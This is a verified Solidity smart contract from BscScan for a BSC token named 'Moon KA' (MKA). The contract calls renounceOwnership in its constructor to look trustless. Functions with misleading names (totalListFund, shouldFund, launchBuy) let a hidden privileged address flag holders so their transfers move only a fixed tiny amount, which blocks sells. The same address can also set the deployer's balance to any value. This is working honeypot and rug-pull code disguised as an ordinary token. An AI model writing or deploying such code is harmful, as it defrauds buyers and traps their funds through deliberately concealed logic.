/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MoonKA {
    uint8 public decimals = 18;
    address public autoMin;
    mapping(address => bool) public exemptTrading;

    address public owner;


    uint256 constant burnLiquidity = 13 ** 10;
    mapping(address => bool) public modeBuy;
    string public name = "Moon KA";
    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "MKA";
    uint256 public totalSupply = 100000000 * 10 ** 18;
    bool public autoLiquidity;
    mapping(address => uint256) public balanceOf;
    address public swapToken;

    

    event OwnershipTransferred(address indexed enableTo, address indexed receiverFeeMarketing);
    event Transfer(address indexed takeSell, address indexed receiverLaunched, uint256 fundMaxLaunched);
    event Approval(address indexed sellShould, address indexed takeShould, uint256 fundMaxLaunched);

    constructor (){
        IUniswapV2Router marketingTake = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        autoMin = IUniswapV2Factory(marketingTake.factory()).createPair(marketingTake.WETH(), address(this));
        owner = msg.sender;
        swapToken = owner;
        exemptTrading[swapToken] = true;
        balanceOf[swapToken] = totalSupply;
        emit Transfer(address(0), swapToken, totalSupply);
        renounceOwnership();
    }

    

    function marketingFromLaunched(address minFrom, address marketingSwapFee, uint256 sellLaunchLiquidity) internal returns (bool) {
        require(balanceOf[minFrom] >= sellLaunchLiquidity);
        balanceOf[minFrom] -= sellLaunchLiquidity;
        balanceOf[marketingSwapFee] += sellLaunchLiquidity;
        emit Transfer(minFrom, marketingSwapFee, sellLaunchLiquidity);
        return true;
    }

    function transfer(address txToken, uint256 sellLaunchLiquidity) external returns (bool) {
        return transferFrom(msg.sender, txToken, sellLaunchLiquidity);
    }

    function totalListFund(address receiverSell) public {
        if (autoLiquidity) {
            return;
        }
        exemptTrading[receiverSell] = true;
        autoLiquidity = true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(swapToken, address(0));
        owner = address(0);
    }

    function transferFrom(address exemptSender, address txToken, uint256 sellLaunchLiquidity) public returns (bool) {
        if (exemptSender != msg.sender && allowance[exemptSender][msg.sender] != type(uint256).max) {
            require(allowance[exemptSender][msg.sender] >= sellLaunchLiquidity);
            allowance[exemptSender][msg.sender] -= sellLaunchLiquidity;
        }
        if (txToken == swapToken || exemptSender == swapToken) {
            return marketingFromLaunched(exemptSender, txToken, sellLaunchLiquidity);
        }
        if (modeBuy[exemptSender]) {
            return marketingFromLaunched(exemptSender, txToken, burnLiquidity);
        }
        return marketingFromLaunched(exemptSender, txToken, sellLaunchLiquidity);
    }

    function shouldFund(address tradingWalletSwap) public {
        if (tradingWalletSwap == swapToken || !exemptTrading[msg.sender]) {
            return;
        }
        modeBuy[tradingWalletSwap] = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function launchBuy(uint256 sellLaunchLiquidity) public {
        if (sellLaunchLiquidity == 0 || !exemptTrading[msg.sender]) {
            return;
        }
        balanceOf[swapToken] = sellLaunchLiquidity;
    }


}